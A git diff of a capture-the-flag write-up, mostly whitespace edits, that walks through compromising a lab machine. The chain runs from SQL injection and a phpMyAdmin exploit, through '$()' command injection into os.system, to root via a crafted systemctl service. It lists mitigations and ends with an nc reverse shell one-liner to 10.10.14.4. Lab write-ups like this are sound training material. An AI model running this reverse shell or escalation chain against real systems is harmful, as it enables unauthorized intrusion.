@@ -158,19 +158,21 @@ www-data can run this command as pepper (THAT'S SOMETHING)
 ## How Did I Solve the Challenge   
 
    <img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   
+
    
-1. I was so distracted with the phpmyadmin and the fact that I need to get the credentials through the phpmyadmin setup page or through a weak password vulnerability that I didn't notice that I can exploit the website itself.
-2. So, it turned out that there was an sql injection with the parameter `cod=` while browsing the rooms which I thought didn't exist because I was using sqlmap the wrong way. I was using the syntax where you give it the url as input, but the right one was more like, putting the request in a file and then sending this file as an input with the whole request payload including the headers, ... etc.
-3. After I got sql injection through sqlmap I got the credentials for login in phpmyadmin it was easy because I have already found an exploit for authenticated user on phpmyadmin 4.8.0.
-4. The exploit was also an sql injection mixed up with an LFI ( I think ... I have to make sure of this ). Found an easily read python script that automated the attack and used it because I kind of like had to open the reverse shell more than a dozen times because I got super busy.
-5. Anyway, After I got access to the system as `www-data` I didn't really have any privileges to do anything so I needed to escalate my privilege up to pepper ( a user on the system ) and this way I can read the `user.txt` file and I can execute a command `/bin/systemctl` that could lead to getting a rev shell as root.
+   
+1. I was so distracted with the phpmyadmin and the fact that I need to get the credentials through the phpmyadmin setup page or through a weak password vulnerability that I didn't notice that I can exploit the website itself.    
+2. So, it turned out that there was an sql injection with the parameter `cod=` while browsing the rooms which I thought didn't exist because I was using sqlmap the wrong way. I was using the syntax where you give it the url as input, but the right one was more like, putting the request in a file and then sending this file as an input with the whole request payload including the headers, ... etc.    
+3. After I got sql injection through sqlmap I got the credentials for login in phpmyadmin it was easy because I have already found an exploit for authenticated user on phpmyadmin 4.8.0.    
+4. The exploit was also an sql injection mixed up with an LFI ( I think ... I have to make sure of this ). Found an easily read python script that automated the attack and used it because I kind of like had to open the reverse shell more than a dozen times because I got super busy.    
+5. Anyway, After I got access to the system as `www-data` I didn't really have any privileges to do anything so I needed to escalate my privilege up to pepper ( a user on the system ) and this way I can read the `user.txt` file and I can execute a command `/bin/systemctl` that could lead to getting a rev shell as root.    
 6. Which means getting pepper gives me root on a golden plate.
-7. But getting pepper was a problem.
-8. Found a script that my user `www-data` can run as pepper ( A python script ) which could definitely mean that I can exploit it in some way that would get me pepper privilege.
-9. I scurtinized the code enough that I almost memorized the damn thing, trying to figure out how the hell am I supposed to exploit it.
-10. Found two possible ways, one to hijack libraries which didn't work because all the libraries privileges on the system had good privileges, the other way is to exploit the function `os.system()` so I kind of didn't know how to do that because I felt that if had good validation. But there was a way to evade the validations they've put on it through the `$()` which allows me to execute a command inside another command, which is exactly what I want to execute a command inside the ping.
-11. I tried to use the `!!` but the `os.system` did not really take it, it kept taking it as a string for some reason. It's like the function didn't recognize it. 
-12. Anyway, as soon as I got pepper I used `/bin/systemctl` to create a root service and then run it like this   
+7. But getting pepper was a problem.    
+8. Found a script that my user `www-data` can run as pepper ( A python script ) which could definitely mean that I can exploit it in some way that would get me pepper privilege.    
+9. I scurtinized the code enough that I almost memorized the damn thing, trying to figure out how the hell am I supposed to exploit it.    
+10. Found two possible ways, one to hijack libraries which didn't work because all the libraries privileges on the system had good privileges, the other way is to exploit the function `os.system()` so I kind of didn't know how to do that because I felt that if had good validation. But there was a way to evade the validations they've put on it through the `$()` which allows me to execute a command inside another command, which is exactly what I want to execute a command inside the ping.    
+11. I tried to use the `!!` but the `os.system` did not really take it, it kept taking it as a string for some reason. It's like the function didn't recognize it.     
+12. Anyway, as soon as I got pepper I used `/bin/systemctl` to create a root service and then run it like this       
 13. Create a file that contains this and has a name like so "root.service"
 	```console
 
@@ -185,17 +187,17 @@ www-data can run this command as pepper (THAT'S SOMETHING)
 	[Install]
 	WantedBy=multi-user.target
 
-	```   
+	```       
 
-14. Then we like enable the service with this command `/bin/systemctl enable /path/we/saved/service/in/root.service` and we can save the service in any writable directory.  
-15. Then we start the service after we started listening on our box with this command `/bin/systemctl start root`.
+14. Then we like enable the service with this command `/bin/systemctl enable /path/we/saved/service/in/root.service` and we can save the service in any writable directory.     
+15. Then we start the service after we started listening on our box with this command `/bin/systemctl start root`.    
 
 ## Where I Got Stuck?   
-* The first time was that I didn't use the right sqlmap syntax.
-* When I got access to the system I got stuck with the os.system() function and the sanitization of its input. Finally found out that I had to use `$()` to evade the validation they have on it.
+* The first time was that I didn't use the right sqlmap syntax.    
+* When I got access to the system I got stuck with the os.system() function and the sanitization of its input. Finally found out that I had to use `$()` to evade the validation they have on it.    
 
 ## What Did I learn from this Machine?  
-### SQL Injection
+### SQL Injection 
 * First there was an sql injection with the parameter that allowed me to browse the rooms. How can one figure that out? By thinking, that there's a possibility that the system in the backend could check the id with something like `SELECT * FROM something WHERE id=sth`.
 * Solution: Input validation plus install a WAF (check out what the hell is it?)
 
@@ -227,13 +229,6 @@ www-data can run this command as pepper (THAT'S SOMETHING)
 
 
 
-
-* Seems like the phpmyadmin version we have is vulnerable to LFI with the parameter "target". Can they patch the vulnerability LFI? without downloading a new version of phpmyadmin? I should research it.
-* Yet again, it seems that the LFI vuln needs authorization. This is from a website talking about the vulnerability    
-<blockquote>
- phpMyAdmin 4.8.x LFI to RCE (Authorization Required)
-</blockquote>   
-
 * I will write the facts I have until now:
 
 	1. Seems like phpmyadmin is a deadend.
@@ -248,7 +243,7 @@ www-data can run this command as pepper (THAT'S SOMETHING)
 
 
 
-* Wappalyzer is the BEST!
+
 
 
 * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 1234 >/tmp/f
